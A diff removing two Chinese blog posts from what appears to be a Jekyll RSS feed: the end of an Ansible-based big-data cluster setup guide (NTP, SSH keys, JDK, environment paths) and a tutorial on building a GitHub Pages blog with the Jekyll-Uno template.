-     sudo: yes
-
-   - name: create workspace		# 创建工作目录和.ssh
-     shell: mkdir -p /home/cat/cat
-
-   - name: chown -R cat:cat /opt # 修改/opt文件夹拥有者
-     shell: chown -R cat:cat /opt
-     sudo: yes
-
-   - name: install ntp 			# 安装ntp，同步各节点时间
-     shell: apt-get -y install ntp
-     sudo: yes
-   - name: config ntp 			# 配置/etc/ntp.conf文件, 注释原来的ntp server, 使用aliyun时间服务器
-     shell: sed -i &quot;s/pool 0.u.*/pool time1.aliyun.com iburst/g&quot; /etc/ntp.conf
-     shell: sed -i &quot;s/pool 1.u.*/pool time2.aliyun.com iburst/g&quot; /etc/ntp.conf 
-     shell: sed -i &quot;s/pool 2.u.*/pool time3.aliyun.com iburst/g&quot; /etc/ntp.conf 
-     shell: sed -i &quot;s/pool 3.u.*/pool time4.aliyun.com iburst/g&quot; /etc/ntp.conf 
-     shell: sed -i &quot;s/pool ntp.ubuntu.com/# pool ntp.ubuntu.com/g&quot; /etc/ntp.conf
-     sudo: yes
-   - name: restart ntp 			# 重启ntp服务
-     shell: service ntp restart
-     sudo: yes
-   - name: check ntp 			# 验证时间是否同步，检查condition列是否有至少一个sys.peer
-     shell: ntpq -c assoc
-
-   - name: check ssh keys 		# 检查是否已生成密钥对
-     stat: path=/home/cat/.ssh/id_rsa
-     register: keys
-   - name: generate ssh keys 	# 在各节点生成密钥对
-     shell: ssh-keygen -t rsa -f /home/cat/.ssh/id_rsa -q -N &quot;&quot;
-     when: not keys.stat.exists
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在所有节点)将每个节点的公钥写入同一份.ssh/authorized_keys中，并分发给所有节点：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/home/cat/.ssh/authorized_keys dest=/home/cat/.ssh/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在所有节点)安装JDK：&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;(在cat1)下载jdk，并分发到各从节点:&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/home/cat/cat/jdk-8u121-linux-x64.tar.gz dest=/home/cat/cat/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;(在所有节点)安装jdk:&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -a &#39;tar -zxvf /home/cat/cat/jdk-8u121-linux-x64.tar.gz -C /opt/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;(在所有节点)修改/etc/profile:&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;(在主节点)修改/etc/profile，在末尾添加：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
- export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
- export HADOOP_HOME=/opt/hadoop-2.7.3
- export SCALA_HOME=/opt/scala-2.11.8
- export SPARK_HOME=/opt/spark-2.1.0
- export HIVE_HOME=/opt/hive-2.1.0
- export ZOOKEEPER_HOME=/opt/zookeeper-3.4.9
- export SQOOP_HOME=/opt/sqoop-1.4.6
- export KAFKA_HOME=/opt/kafka-0.10.2.0
-
- export PATH=$PATH:$JAVA_HOME/bin
- export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin
- export PATH=$PATH:$HIVE_HOME/bin
- export PATH=$PATH:$SCALA_HOME/bin:$SPARK_HOME/bin:$SPARK_HOME/sbin
- export PATH=$PATH:$ZOOKEEPER_HOME/bin
- export PATH=$PATH:$SQOOP_HOME/bin
- export PATH=$PATH:$KAFKA_HOME/bin
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;(在所有节点)分发/etc/profile，需要加上-s参数，使其使用sudo权限copy：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -s -m copy -a &#39;src=/etc/profile dest=/etc/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;zookeeperhttpswuyinan0126githubio20175-&quot;&gt;下一步：&lt;a href=&quot;https://wuyinan0126.github.io/2017/大数据学习笔记(5)-分布式协调系统/&quot;&gt;安装分布式协调系统——Zookeeper&lt;/a&gt;&lt;/h2&gt;
-&lt;hr /&gt;
-</description>
-        <pubDate>Wed, 16 Nov 2016 08:00:00 +0800</pubDate>
-        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)-Overview/</link>
-        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)-Overview/</guid>
-        
-        <category>原创</category>
-        
-        <category>大数据</category>
-        
-        
-        <category>原创</category>
-        
-        <category>大数据</category>
-        
-      </item>
-    
-      <item>
-        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; GitHub个人博客搭建</title>
-        <description>&lt;p&gt;&lt;em&gt;使用Jekyll-Uno模版在GitHub上搭建个人博客，并添加评论和Google Analytics的功能。包括GitHub相关准备工作、本地开发环境的搭建和其它实用工具&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;github&quot;&gt;GitHub相关准备工作&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;在自己的GitHub仓库中创建名为username.github.io的项目，例如wuyinan0126.github.io&lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;将你的username.github.io项目（以下称根目录）git clone到本地&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cd $MY_WORKSPACE
- $ git clone https://github.com/username/username.github.io.git
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;下载Jekyll-Uno模版并解压&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ wget https://github.com/joshgerdes/jekyll-uno/archive/master.zip
- $ unzip jekyll-uno-master.zip
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;将解压后的jekyll-uno-master目录中的所有文件复制进根目录&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cp -r ./jekyll-uno-master/* ./username.github.io/
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;进入根目录，修改配置文件_config.yml，将url和baseurl修改为&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cd username.github.io
- $ vi ./_config.yml
-   -	url: &#39;https://username.github.io&#39;
-   -	baseurl: &#39;/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在根目录，提交并上传更新&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ git add .
- $ git commit -a -m &quot;Initial Blog&quot;
- $ git push origin master
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;查看你的GitHub仓库中的username.github.io项目，确认代码上传成功。然后，访问http://username.github.io。Suprise！至此，我们已经将Jekyll-Uno模版展示在我们的个人博客上了！&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;jekyll-server&quot;&gt;使用Jekyll Server进行本地预览&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;安装Ruby和RubyGems，并将Ruby源替换为Ruby淘宝镜像源&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ gem sources --remove https://rubygems.org/ 
- $ gem sources -a https://ruby.taobao.org/ 
- $ gem sources -l  
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在根目录，安装Jekyll Server&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ gem install bundler
- $ bundle install
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在根目录，启动Jekyll Server&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ bundle exec jekyll serve --watch
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在&lt;a href=&quot;http://localhost:4000/&quot;&gt;http://localhost:4000/&lt;/a&gt;查看本地预览&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;sublime-2omnimarkuppreviewer&quot;&gt;使用Sublime 2和OmniMarkupPreviewer进行博文撰写&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;安装Sublime 2，并在Package Control中输入Install Package，搜索并安装OmniMarkupPreviewer。重启Sublime 2&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;进入根目录下的_posts目录，这是用于存放博文的地方，新建一个相同命名格式的文件，例如2016-09-15-GitHub个人博客搭建.markdown，并使用&lt;a href=&quot;http://www.appinn.com/markdown/#autoescape&quot;&gt;markdown语法&lt;/a&gt;进行博文撰写&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在Sublime 2的Markdown标签页点击鼠标右键，选择Preview Current Markup in Browser。或者使用快捷键（OSX ⌘+⌥+O; Windows, Linux Ctrl+Alt+O）来实时预览&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;对根目录内容进行修改后，提交并上传更新&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ git add .
- $ git commit -a -m &quot;COMMENT&quot;
- $ git push origin master
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;section&quot;&gt;添加评论功能&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;注册&lt;a href=&quot;https://disqus.com/&quot;&gt;Disqus&lt;/a&gt;账户，点击“I want to install Disqus on my site”，并填写基本信息&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;选择平台。选择“install manually with Universal Code”，将获得的代码复制到根目录下的_includes/disqus.html中，Universal Code中需要修改的地方如下&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; var disqus_config = function () {
-   this.page.url = &#39;{{ site.url }}{{ page.url }}&#39;; 
-   this.page.identifier = &#39;{{ page.id }}&#39;; 
-   this.page.title = &#39;{{ page.title }}&#39;;
- };
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; disqus_shortname: &#39;Disqus用户名&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;google-analytics&quot;&gt;添加Google Analytics&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;登录Google Analytics创建新网站，生成跟踪ID&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; google_analytics: &#39;跟踪ID&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;section-1&quot;&gt;页面布局修改&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;首页添加tag选项&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录下_includes/header.html:&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
-  &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
-    &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}#blog&quot; title=&quot;link to {{ site.title }} blog&quot; class=&quot;blog-button&quot;&amp;gt;Blog&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-  &amp;lt;/ul&amp;gt;
-  &amp;lt;/nav&amp;gt;
-
- +++
- &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
- &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
-  &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}tags&quot; title=&quot;link to {{ site.title }} tags&quot; class=&quot;blog-button&quot;&amp;gt;Tags&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
- &amp;lt;/ul&amp;gt;
- &amp;lt;/nav&amp;gt;
- +++
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录下_layouts/tags.html:&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;a href=&quot;{{ post.url }}&quot;&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;博文页添加“上一篇”“下一篇”按钮&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录下css/main.css，在最后添加:&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; .page_navigation {
-   font-size: 14px;
-   display: block;
-   width: auto;
-   overflow: hidden;
- }
-
- .page_navigation a {
-   display: block;
-   width: 50%;
-   float: left;
-   margin: 1em 0;
- }
-
- .page_navigation .next {
-   text-align: right;
- }
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录下_layouts/post.html，添加：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;section class=&quot;post&quot;&amp;gt;
- {{ content }}
- +++
-     &amp;lt;div class=&quot;page_navigation&quot;&amp;gt;
-     {% if page.previous %}
-       &amp;lt;a class=&quot;prev&quot; href=&quot;{{page.previous.url}}&quot;&amp;gt;&amp;amp;laquo; {{page.previous.title}}&amp;lt;/a&amp;gt;
-     {% endif %}
-     {% if page.next %}
-       &amp;lt;a class=&quot;next&quot; href=&quot;{{page.next.url}}&quot;&amp;gt;{{page.next.title}} &amp;amp;raquo;&amp;lt;/a&amp;gt;
-     {% endif %}
-     &amp;lt;/div&amp;gt;
- +++
- &amp;lt;/section&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;添加页面，例如About Me页面&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;在根目录下新建me.md，内容如下：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
- layout: me
- title: About Me
- permalink: /me/
- ---
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在根目录的_layouts中新建me.html，内容如下：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
- layout: default
- ---
-
- &amp;lt;article id=&quot;about-me&quot; class=&quot;post-container post-container--single&quot;&amp;gt;
-   &amp;lt;h1 class=&quot;post-title&quot;&amp;gt;About Me&amp;lt;/h1&amp;gt;
-   &amp;lt;/header&amp;gt;
-   &amp;lt;section class=&quot;post&quot;&amp;gt;
-     {% capture about %}{% include me.md %}{% endcapture %}
-     {{ about | markdownify }}
-   &amp;lt;/section&amp;gt;
- &amp;lt;/article&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在根目录的_includes中新建me.md，内容为你想展示在页面的内容&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录的_includes/header.html，添加按钮：&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
-   &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
-     &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}me&quot; title=&quot;link to {{ site.title }} about me&quot; class=&quot;blog-button&quot;&amp;gt;Me&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
-   &amp;lt;/ul&amp;gt;
- &amp;lt;/nav&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;显示表格边界&lt;/p&gt;
-
-    &lt;p&gt;在根目录的css/main.css中添加：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;style type=&quot;text/css&quot;&amp;gt;
- table{
-     border-collapse: collapse;
-     border-spacing: 0;
-     border: 1px solid #F3F3F3;
- }
-
- th{
-     border: 1px solid #F3F3F3;
-     padding: 6px 13px
- }
-
- td{
-     border: 1px solid #F3F3F3;
-     padding: 6px 13px
- }
- &amp;lt;/style&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;修改blog页面中左边封面和右边博文列表比例&lt;/p&gt;
-
-    &lt;p&gt;css/uno.css:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; .content-wrapper {
-     z-index: 800;
- -	width: 60%;
- +	width: 80%;
- -	max-width: 800px;
- +	max-width: 1200px;
-     margin-left: 40%; }
-
- .panel-cover--collapsed {
-     width: 40%;
- - 	max-width: 530px; }
- +	max-width: 400px; }
-
- .no-js .panel-main {
-     width: 40%;
- - 	max-width: 530px; }
- +	max-width: 400px; }
-
- @media all and (min-width: 1300px) {
-     .content-wrapper {
- -		margin-left: 530px; } }
- +		margin-left: 400px; } }
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-
-    &lt;p&gt;js/main.js:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; - $(&#39;.panel-cover&#39;).animate({&#39;max-width&#39;: &#39;530px&#39;, &#39;width&#39;: &#39;40%&#39;}
- + $(&#39;.panel-cover&#39;).animate({&#39;max-width&#39;: &#39;400px&#39;, &#39;width&#39;: &#39;40%&#39;}
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;section-2&quot;&gt;其它实用工具&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用MathJax引擎在markdown中插入公式&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;在Sublime 2的Package Settings中选择OmniMarkupPreviewer，修改default setting中的&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &quot;mathjax_enabled&quot;: true
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-
-        &lt;p&gt;以启用MathJax引擎&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改根目录下的_includes/head.html文件，在&amp;lt;head&amp;gt;标签中添加&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&amp;gt;&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-
-        &lt;p&gt;以在页面渲染时加载MathJax.js&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;测试。在markdown文件中输入&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $$x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}$$
- \\(x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}\\)
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-
-        &lt;p&gt;上面为行间公式，下面为行内公式。使用Sublime 2的OmniMarkupPreviewer或Jekyll Server进行预览&lt;/p&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在markdown中链接本地图片&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;在根目录中新建一个用于存放你的图片的文件夹，例如assets，放入图片，例如test.jpg&lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;在markdown文件中链接&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ![TITLE](/assets/test.jpg &quot;TITLE&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-
-        &lt;p&gt;此适用于Jekyll Server进行预览，不适用于OmniMarkupPreviewer预览&lt;/p&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;语法高亮&lt;/p&gt;
-
-    &lt;ol&gt;
-      &lt;li&gt;
-        &lt;p&gt;语法高亮将仅支持Rouge&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ rougify help style
- usage: rougify style [&amp;lt;theme-name&amp;gt;] [&amp;lt;options&amp;gt;]
-
- Print CSS styles for the given theme.  Extra options are
- passed to the theme.  Theme defaults to thankful_eyes.
-
- options:
-   --scope	(default: .highlight) a css selector to scope by
-
- available themes:
-   base16, base16.dark, base16.monokai, base16.monokai.light, base16.solarized, base16.solarized.dark, colorful, github, molokai, monokai, monokai.sublime, thankful_eyes
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;使用Rouge生成样式&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ rougify style colorful &amp;gt; css/colorful.css
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;修改css/main.css&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; @import url(colorful.css);
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;使用&lt;/p&gt;
-
-        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;highlight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;代码&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
- &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;endhighlight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-</description>
-        <pubDate>Fri, 08 Jan 2016 23:04:23 +0800</pubDate>
-        <link>https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
-        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
-        
-        <category>原创</category>
-        
-        <category>技术宅</category>
-        
-        
-        <category>原创</category>
-        
-        <category>技术宅</category>
         
       </item>
     
